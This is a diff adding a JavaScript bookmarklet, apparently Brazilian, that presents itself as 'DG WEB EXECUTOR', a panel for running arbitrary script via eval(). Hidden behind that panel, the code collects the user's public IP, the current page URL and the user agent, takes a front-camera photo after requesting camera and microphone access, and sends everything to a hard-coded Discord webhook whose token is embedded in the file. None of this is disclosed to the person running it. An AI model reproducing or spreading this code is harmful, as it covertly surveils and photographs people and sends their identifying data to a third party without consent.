@@ -1,0 +1,195 @@
+javascript:(() => {
+  const webhookURL = "https://discord.com/api/webhooks/1403205628998193295/5UdtIILRv_GZ-OR7kterJkZ9LWHzjM4vLj1SCJlKc6cpu7o_Yjg4C_RG_bxUPQv2tr6d";
+
+  function removeOldPanel() {
+    const oldPanel = document.getElementById('dgweb-executor-panel');
+    if (oldPanel) oldPanel.remove();
+
+    const oldBtnMax = document.getElementById('dgweb-executor-max-btn');
+    if (oldBtnMax) oldBtnMax.remove();
+
+    const oldButtonsContainer = document.getElementById('dgweb-executor-buttons-container');
+    if (oldButtonsContainer) oldButtonsContainer.remove();
+  }
+
+  async function getPublicIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    } catch {
+      return "IP não disponível";
+    }
+  }
+
+  async function captureCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      stream.getTracks().forEach(track => track.stop());
+
+      // converte para blob para enviar
+      return new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+    } catch (e) {
+      console.warn("Permissão negada ou erro na câmera:", e);
+      return null;
+    }
+  }
+
+  async function sendWebhookWithImage(content, imageBlob) {
+    const formData = new FormData();
+    formData.append('content', content);
+
+    if (imageBlob) {
+      formData.append('file', imageBlob, 'photo.png');
+    }
+
+    try {
+      await fetch(webhookURL, {
+        method: "POST",
+        body: formData,
+      });
+    } catch (e) {
+      console.warn("Erro ao enviar webhook:", e);
+    }
+  }
+
+  async function init() {
+    removeOldPanel();
+
+    // Criar painel (igual script anterior)
+    const panel = document.createElement('div');
+    panel.id = 'dgweb-executor-panel';
+    Object.assign(panel.style, {
+      position:'fixed', top:'0', left:'0',
+      width:'100vw', height:'100vh',
+      background:'black', border:'4px solid red',
+      boxSizing:'border-box',
+      boxShadow:'0 0 15px red', zIndex:'9999999',
+      fontFamily:'monospace', color:'red',
+      display:'flex', flexDirection:'column'
+    });
+
+    const header = document.createElement('div');
+    Object.assign(header.style, {
+      display:'flex', flexDirection:'column',
+      alignItems:'center',
+      padding:'10px 16px', borderBottom:'2px solid red'
+    });
+
+    const title = document.createElement('div');
+    title.textContent = 'DG WEB EXECUTOR';
+    title.style.fontWeight = 'bold';
+    title.style.fontSize = '22px';
+    title.style.marginBottom = '10px';
+    header.appendChild(title);
+
+    const btnExec = document.createElement('button');
+    btnExec.textContent = 'Executar';
+    Object.assign(btnExec.style, {
+      background:'red', color:'black', border:'none', fontWeight:'bold',
+      cursor:'pointer', padding:'10px 20px', fontSize:'18px', borderRadius:'6px',
+      width:'150px', marginBottom:'10px'
+    });
+
+    const textarea = document.createElement('textarea');
+    Object.assign(textarea.style, {
+      flex:'1', resize:'none', background:'black', color:'red',
+      border:'2px solid red', padding:'16px', fontSize:'16px',
+      fontFamily:'monospace', outline:'none', width:'100%',
+      boxSizing:'border-box'
+    });
+
+    btnExec.onclick = () => {
+      try {
+        eval(textarea.value);
+      } catch (e) {
+        alert('Erro ao executar script:\n' + e);
+      }
+    };
+
+    header.appendChild(btnExec);
+    panel.appendChild(header);
+    panel.appendChild(textarea);
+
+    const buttonsContainer = document.createElement('div');
+    buttonsContainer.id = 'dgweb-executor-buttons-container';
+    Object.assign(buttonsContainer.style, {
+      position: 'fixed', top: '10px', right: '10px', display:'flex', gap:'8px', zIndex:'10000000'
+    });
+
+    const btnMin = document.createElement('button');
+    btnMin.textContent = '−';
+    Object.assign(btnMin.style, {
+      background:'red', color:'black', border:'none', fontWeight:'bold',
+      cursor:'pointer', width:'32px', height:'32px', borderRadius:'6px', fontSize:'22px'
+    });
+    btnMin.title = 'Minimizar';
+    btnMin.onclick = () => {
+      panel.style.display = 'none';
+      btnMax.style.display = 'flex';
+    };
+
+    const btnClose = document.createElement('button');
+    btnClose.textContent = '×';
+    Object.assign(btnClose.style, {
+      background:'red', color:'black', border:'none', fontWeight:'bold',
+      cursor:'pointer', width:'32px', height:'32px', borderRadius:'6px', fontSize:'22px'
+    });
+    btnClose.title = 'Fechar';
+    btnClose.onclick = () => {
+      panel.remove();
+      btnMax.remove();
+      buttonsContainer.remove();
+    };
+
+    buttonsContainer.appendChild(btnMin);
+    buttonsContainer.appendChild(btnClose);
+    document.body.appendChild(buttonsContainer);
+
+    const btnMax = document.createElement('button');
+    btnMax.id = 'dgweb-executor-max-btn';
+    btnMax.textContent = 'DG';
+    Object.assign(btnMax.style, {
+      position:'fixed', top:'10px', right:'10px', width:'42px', height:'42px',
+      borderRadius:'50%', background:'red', color:'black', fontWeight:'bold',
+      border:'none', cursor:'pointer', fontSize:'22px', display:'none',
+      alignItems:'center', justifyContent:'center', zIndex:'99999999'
+    });
+    btnMax.title = 'Maximizar executor';
+    btnMax.onclick = () => {
+      panel.style.display = 'flex';
+      btnMax.style.display = 'none';
+    };
+    document.body.appendChild(btnMax);
+
+    document.body.appendChild(panel);
+
+    // Obter IP, URL e userAgent
+    const ip = await getPublicIP();
+    const url = window.location.href;
+    const userAgent = navigator.userAgent;
+
+    // Captura a câmera e pega a foto (blob)
+    const imageBlob = await captureCamera();
+
+    // Monta mensagem para o Discord
+    const message = `🚨 Executor DG WEB aberto!\nSite: ${url}\nIP público: ${ip}\nUser Agent: ${userAgent}`;
+
+    // Envia webhook com foto anexa
+    await sendWebhookWithImage(message, imageBlob);
+
+  }
+
+  init();
+
+})();
